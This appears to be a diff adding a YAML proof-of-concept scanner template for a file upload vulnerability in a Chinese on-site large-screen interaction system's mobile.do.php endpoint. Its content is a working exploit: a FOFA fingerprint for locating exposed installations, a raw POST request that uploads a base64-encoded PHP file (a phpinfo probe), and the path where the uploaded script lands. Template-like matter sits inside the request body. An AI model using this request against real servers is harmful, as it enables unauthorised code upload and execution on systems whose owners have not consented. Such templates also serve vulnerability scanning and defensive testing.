@@ -1,0 +1,66 @@
+id: poc-wgf473qz2vep3pi7
+info:
+  name: 金华迪加网络科技有限公司现场大屏互动系统mobile.do.php存在文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wgf473qz2vep3pi7'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wgf473qz2vep3pi7
+    fofa: body="/wall/themes/meepo/assets/images/defaultbg.jpg"
+http:
+- raw:
+  - 'POST /mobile/mobile.do.php?action=msg_uploadimg HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: PHPSESSID=qrchh064ani2b3h8flue9qo6e6
+
+    Content-Length: 52
+
+    Pragma: no-cache
+
+    Cache-Control: no-cache
+
+    Sec-Ch-Ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
+
+    Sec-Ch-Ua-Mobile: ?0
+
+    Sec-Ch-Ua-Platform: "Windows"
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Sec-Fetch-Site: cross-site
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-Dest: document
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Sec-Fetch-User: ?1
+
+    Priority: u=0, i
+
+    Connection: close
+
+
+    filetype=php&imgbase64=PD9waHAgcGhwaW5mbygpOw%3D%3D
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730077447234-407f7636-791f-430d-a9e6-56dcf8217282.png)
+
+    上传定位：data//pic//pic_172973993847989.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
